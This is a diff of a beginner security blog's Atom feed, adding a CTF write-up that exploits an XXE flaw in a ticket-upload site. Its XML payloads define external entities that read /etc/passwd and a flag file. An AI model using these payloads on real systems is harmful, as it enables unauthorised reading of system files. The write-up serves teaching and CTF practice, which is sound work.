@@ -1,4 +1,77 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-07-02T22:23:41+02:00</updated><id>http://localhost:4000/</id><title type="html">Computer Security for Beginners</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">Data exfiltration with PING: ICMP - NDH16</title><link href="http://localhost:4000/forensic/2018/07/02/ICMP-data-exfiltration-NDH-ICMP.html" rel="alternate" type="text/html" title="Data exfiltration with PING: ICMP - NDH16" /><published>2018-07-02T22:00:00+02:00</published><updated>2018-07-02T22:00:00+02:00</updated><id>http://localhost:4000/forensic/2018/07/02/ICMP-data-exfiltration-NDH-ICMP</id><content type="html" xml:base="http://localhost:4000/forensic/2018/07/02/ICMP-data-exfiltration-NDH-ICMP.html">&lt;p&gt;An interesting forensic challenge covering a famous method of data exfiltration…
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-07-03T22:37:01+02:00</updated><id>http://localhost:4000/</id><title type="html">Computer Security for Beginners</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">XML External Entities: Wonkachall-step1 - NDH16</title><link href="http://localhost:4000/web/2018/07/03/Wonka-chall-step1-NDH16.html" rel="alternate" type="text/html" title="XML External Entities: Wonkachall-step1 - NDH16" /><published>2018-07-03T22:00:00+02:00</published><updated>2018-07-03T22:00:00+02:00</updated><id>http://localhost:4000/web/2018/07/03/Wonka-chall-step1-NDH16</id><content type="html" xml:base="http://localhost:4000/web/2018/07/03/Wonka-chall-step1-NDH16.html">&lt;p&gt;This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.&lt;/p&gt;
+
+&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
+
+&lt;p&gt;We have &lt;a href=&quot;http://willywonka.shop:4242/&quot;&gt;a website&lt;/a&gt; which is actually The Golden Ticket Blackmarket platform. It proposes a list of purchasable golden tickets where each ticket has a bitcoin cost, a name and an address.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/tickets.png&quot; alt=&quot;Wonka Shop screen capture&quot; title=&quot;Willy Wonka Shop&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The challenge statement says that the flag is stored in ““/flags.txt”. The objective is to take control of this website. Hurry up!&lt;/p&gt;
+
+&lt;h2 id=&quot;take-my-golden-ticket&quot;&gt;Take my Golden Ticket!&lt;/h2&gt;
+
+&lt;p&gt;The first reflex to have when you arrive on a website should be to hit “CTRL+U” and dive deep into the source code.
+The vast majority of this website is static at the exception of the “/upload.php” page. We are able to upload a zip archive containing a &lt;strong&gt;MANIFEST.xml&lt;/strong&gt; and a &lt;strong&gt;Ticket&lt;/strong&gt; as shown in the provided example.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/upload.png&quot; alt=&quot;Upload page screen capture&quot; title=&quot;Upload page&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;Ticket file&lt;/strong&gt; contains a string representing the content of the Golden Ticket and the &lt;strong&gt;MANIFEST.xml&lt;/strong&gt; stores the three variables displayed on the home page for each ticket, as shown below:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Wait a second… it means that the server is parsing XML files in order to get these values… Very interesting! :smiling_imp:&lt;/p&gt;
+
+&lt;p&gt;Have you ever heard of XML external entities?&lt;/p&gt;
+
+&lt;h2 id=&quot;thats-not-a-ticket&quot;&gt;That’s not a Ticket&lt;/h2&gt;
+
+&lt;p&gt;XML External Entity Processing attack aim at exploiting &lt;strong&gt;weakly configured XML parsers&lt;/strong&gt;. The objective is to reference external entities inside the XML document in order to &lt;strong&gt;access local resources&lt;/strong&gt; or to &lt;strong&gt;execute code remotely&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Alright, now let’s modify our MANIFEST.xml to detect if the website is vulnerable. I suggest the following payload, supposed to include “/etc/passwd” and to display it in place of the ticket’s address:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we zip the MANIFEST and the Ticket, we upload it and… :tada:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/etcpasswd.png&quot; alt=&quot;XXE disclosure&quot; title=&quot;/etc/passwd&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Say Hello to the list of users!&lt;/p&gt;
+
+&lt;p&gt;Fine, now we can forge the payload that will allow us to retrieve the flag located under “/flag.txt”. This is basically the same payload as before in which we replace the target file as follows:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And here comes the reward! :triangular_flag_on_post:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/flag.png&quot; alt=&quot;XXE disclosure&quot; title=&quot;Flag&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can now read the writeup of Wonkachall-step2 :wink:&lt;/p&gt;
+
+&lt;p&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.</summary></entry><entry><title type="html">Data exfiltration with PING: ICMP - NDH16</title><link href="http://localhost:4000/forensic/2018/07/02/Data-exfiltration-with-PING-ICMP-NDH16.html" rel="alternate" type="text/html" title="Data exfiltration with PING: ICMP - NDH16" /><published>2018-07-02T22:00:00+02:00</published><updated>2018-07-02T22:00:00+02:00</updated><id>http://localhost:4000/forensic/2018/07/02/Data-exfiltration-with-PING-ICMP-NDH16</id><content type="html" xml:base="http://localhost:4000/forensic/2018/07/02/Data-exfiltration-with-PING-ICMP-NDH16.html">&lt;p&gt;An interesting forensic challenge covering a famous method of data exfiltration…
  &lt;!--excerpt--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
